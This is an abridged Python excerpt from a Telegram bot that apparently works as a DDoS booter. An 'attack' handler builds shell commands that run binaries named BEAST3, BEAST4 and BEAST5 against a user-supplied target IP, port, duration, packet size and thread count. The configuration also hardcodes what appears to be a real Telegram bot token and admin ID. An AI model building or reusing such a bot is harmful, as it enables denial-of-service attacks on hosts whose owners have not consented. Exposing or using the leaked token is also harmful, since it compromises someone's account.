...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7245178186:AAHtT68PXXCE04QB43Eig22WTv84lFE-F78'
ADMIN_USER_ID = 6258597033 
ADMIN_USER_ID = 6258597033 
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./BEAST3 {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./BEAST4 {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./BEAST5 {ip} {port} {duration} {byte_size} {threads}"
